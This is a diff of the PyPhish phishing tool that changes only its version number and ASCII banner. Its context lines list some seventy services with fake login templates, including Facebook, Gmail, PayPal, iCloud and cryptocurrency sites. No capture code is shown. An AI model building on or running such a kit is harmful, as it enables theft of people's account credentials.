@@ -1,6 +1,6 @@
 # -*- coding: UTF-8 -*-
 # Tool    : PyPhish
-# Version : 1.6
+# Version : 1.0
 # Author  : SnehKr
 # Github  : https://github.com/SnehKr
 # Contact : https://m.me/SnehKr
@@ -113,12 +113,12 @@ info2= green + '[' + white + '•' + green + '] '+ purple
 logo=f'''
 {red}  _____       _____  _     _     _               
 {cyan} |  __ \     |  __ \| |   (_)   | |              
-{yellow} | |__) |   _| |__) | |__  _ ___| |__   ___ _ __ 
-{blue} |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
-{red} | |   | |_| | |    | | | | \__ \ | | |  __/ |   
-{yellow} |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
-{green}         __/ |                          {cyan}[v1.6]
-{cyan}        |___/                   {red}[By SnehKr]
+{yellow} | |__) |   _| |__) | |__  _ ___| |__ 
+{blue} |  ___/ | | |  ___/| '_ \| / __| '_ \ 
+{red} | |   | |_| | |    | | | | \__ \ | | | 
+{yellow} |_|    \__, |_|    |_| |_|_|___/_| |_| 
+{green}         __/ |                          {cyan}[v1.0]
+{cyan}        |___/                       {red}[By SnehKr]
 '''
 
 sites=["Facebook Traditional", "Facebook Voting","Facebook Security", "Messenger", "Instagram Traditional", "Insta Auto Followers", "Insta 1000 Followers", "Insta Blue Verify", "Gmail Old", "Gmail New","Gmail Poll","Microsoft","Netflix","Paypal","Steam","Twitter","PlayStation","TikTok","Twitch","Pinterest","SnapChat", "LinkedIn","Ebay","Quora","Protonmail","Spotify","Reddit","Adobe","DevianArt","Badoo","Clash Of Clans","Ajio","JioRouter","FreeFire","Pubg","Telegram","Youtube","Airtel","SocialClub","Ola","Outlook","Amazon","Origin","DropBox","Yahoo","WordPress","Yandex","StackOverflow","VK","VK Poll","Xbox","Mediafire","Gitlab","Github","Apple","iCloud","Shopify","Myspace","Shopping","Cryptocurrency","SnapChat2","Verizon","Wi-Fi","Discord","Roblox","Custom"]
